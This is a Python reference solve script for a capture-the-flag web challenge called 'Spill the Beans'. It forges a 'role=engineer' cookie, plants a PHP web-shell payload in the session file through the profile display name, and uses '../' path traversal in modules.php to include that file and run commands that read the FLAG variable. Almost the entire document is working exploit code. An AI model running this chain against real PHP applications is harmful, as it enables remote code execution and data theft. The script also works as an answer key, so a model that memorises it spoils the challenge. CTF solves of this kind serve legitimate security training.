#!/usr/bin/env python3
"""
Reference solve for Spill the Beans.

Chain:
  1. Visit the console once to pick up the default 'role=crew' cookie and a
     PHPSESSID.
  2. Flip the 'role' cookie to 'engineer' client-side - it's never validated
     server-side, so the engineering-only module loader opens right up.
  3. POST a PHP web-shell payload as the profile display name. PHP writes it
     verbatim into the session file on disk (session.save_path defaults to
     /tmp since the image never overrides it).
  4. Call modules.php with a plain '../' traversal payload (the module loader
     builds the include path straight from the 'module' query param, with no
     filtering) to include our own poisoned session file instead of a real
     module.
  5. The included file executes our payload as PHP, giving us a command
     shell. Read the FLAG environment variable through it.

Usage: python3 solve.py http://<host>:<port>
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8080"

PAYLOAD = '<?php system($_GET["c"]); ?>'


def main():
    s = requests.Session()

    # 2. Trust-the-client role gate: just set the cookie ourselves from the
    #    start. We deliberately never hit index.php (which would otherwise
    #    hand us a 'role=crew' cookie) - PHP keeps only the first value for a
    #    repeated cookie name, so a duplicate 'role' would lose to 'crew'.
    engineer = {"role": "engineer"}

    # 1 & 3. First request also creates our session (PHPSESSID) and poisons
    #    the session file via the profile display name in one step.
    r = s.post(
        f"{BASE}/profile.php", data={"display_name": PAYLOAD}, cookies=engineer
    )
    r.raise_for_status()
    session_id = s.cookies.get("PHPSESSID")
    if not session_id:
        sys.exit("no PHPSESSID cookie issued - is the service up?")

    # 4. Traverse out of the modules dir (outside webroot) to /tmp/sess_<id>.
    #    The loader does no filtering on 'module' at all, so plain '../'
    #    segments work.
    session_file = f"../../../tmp/sess_{session_id}"
    r = s.get(
        f"{BASE}/modules.php",
        params={"module": session_file, "c": "env"},
        cookies=engineer,
    )
    r.raise_for_status()

    match = re.search(r"FLAG=(\S+)", r.text)
    if not match:
        print("---- response body ----")
        print(r.text)
        sys.exit("FLAG not found in response - check the chain above")

    print(match.group(1))


if __name__ == "__main__":
    main()
